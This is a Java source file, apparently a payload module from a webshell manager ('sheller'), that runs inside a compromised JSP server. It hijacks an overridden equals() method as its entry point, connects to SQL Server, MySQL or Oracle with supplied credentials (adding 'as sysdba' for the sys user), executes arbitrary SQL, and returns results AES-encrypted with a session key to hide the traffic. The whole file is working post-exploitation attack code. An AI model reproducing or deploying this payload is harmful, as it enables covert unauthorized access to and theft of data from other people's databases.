package vip.youwe.sheller.payload.java;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletOutputStream;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpSession;
import javax.servlet.jsp.PageContext;
import java.nio.charset.StandardCharsets;
import java.sql.*;
import java.util.*;

public class Database {

    public static String type;
    public static String host;
    public static String port;
    public static String user;
    public static String pass;
    public static String database;
    public static String sql;
    private ServletResponse Response;
    private HttpSession Session;

    public boolean equals(Object obj) {
        PageContext page = (PageContext) obj;
        this.Session = page.getSession();
        this.Response = page.getResponse();

        Map<String, String> result = new HashMap<String, String>();
        try {
            executeSQL();
            result.put("msg", executeSQL());
            result.put("status", "success");
        } catch (Exception e) {
            e.printStackTrace();
            result.put("status", "fail");
            if (e instanceof ClassNotFoundException) {
                result.put("msg", "NoDriver");
            } else {
                result.put("msg", e.getMessage());
            }
        }

        try {
            ServletOutputStream so = this.Response.getOutputStream();
            so.write(Encrypt(buildJson(result, true).getBytes(StandardCharsets.UTF_8)));
            so.flush();
            so.close();
            page.getOut().clear();
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }

    public String executeSQL() throws Exception {
        String result = "[";
        String driver = null, url = null;
        if (type.equals("sqlserver")) {

            driver = "com.microsoft.sqlserver.jdbc.SQLServerDriver";
            url = "jdbc:sqlserver://%s:%s;DatabaseName=%s";

        } else if (type.equals("mysql")) {

            driver = "com.mysql.jdbc.Driver";
            url = "jdbc:mysql://%s:%s/%s";
        } else if (type.equals("oracle")) {

            driver = "oracle.jdbc.driver.OracleDriver";
            url = "jdbc:oracle:thin:@%s:%s:%s";
            if (user.equals("sys"))
                user += " as sysdba";
        }
        url = String.format(url, host, port, database);

        Class.forName(driver);

        Connection con = DriverManager.getConnection(url, user, pass);

        Statement statement = con.createStatement();

        ResultSet rs = statement.executeQuery(sql);
        ResultSetMetaData metaData = rs.getMetaData();

        int count = metaData.getColumnCount();

        String[] colNames = new String[count];

        for (int i = 0; i < count; i++) {
            colNames[i] = metaData.getColumnLabel(i + 1);
        }
        result = result + "[";
        for (String col : colNames) {
            String colRecord = String.format("{\"name\":\"%s\"}", col);
            result = result + colRecord + ",";
        }
        result = result.substring(0, result.length() - 1);
        result = result + "],";
        Map<String, Object> record = new LinkedHashMap<String, Object>();
        List<Map<String, Object>> recordList = new ArrayList<Map<String, Object>>();
        while (rs.next()) {
            result = result + "[";
            for (String col : colNames) {
                record.put(col, rs.getObject(col));
                result = result + "\"" + rs.getObject(col) + "\",";
            }
            recordList.add(record);
            result = result.substring(0, result.length() - 1);
            result = result + "],";
        }
        result = result.substring(0, result.length() - 1);
        result = result + "]";
        rs.close();
        con.close();
        return result;
    }

    private byte[] Encrypt(byte[] bs) throws Exception {
        String key = this.Session.getAttribute("u").toString();
        byte[] raw = key.getBytes(StandardCharsets.UTF_8);
        SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
        Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
        cipher.init(1, skeySpec);
        return cipher.doFinal(bs);
    }


    private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
        StringBuilder sb = new StringBuilder();
        String version = System.getProperty("java.version");
        sb.append("{");
        for (String key : entity.keySet()) {

            sb.append("\"" + key + "\":\"");
            String value = entity.get(key);
            if (encode) {
                if (version.compareTo("1.9") >= 0) {
                    this.getClass();
                    Class Base64 = Class.forName("java.util.Base64");
                    Object Encoder = Base64.getMethod("getEncoder", null).invoke(Base64, null);
                    value = (String) Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));
                } else {
                    this.getClass();
                    Class Base64 = Class.forName("sun.misc.BASE64Encoder");
                    Object Encoder = Base64.newInstance();
                    value = (String) Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes(StandardCharsets.UTF_8));

                    value = value.replace("\n", "").replace("\r", "");
                }
            }
            sb.append(value);
            sb.append("\",");
        }
        if (sb.toString().endsWith(","))
            sb.setLength(sb.length() - 1);
        sb.append("}");
        return sb.toString();
    }
}
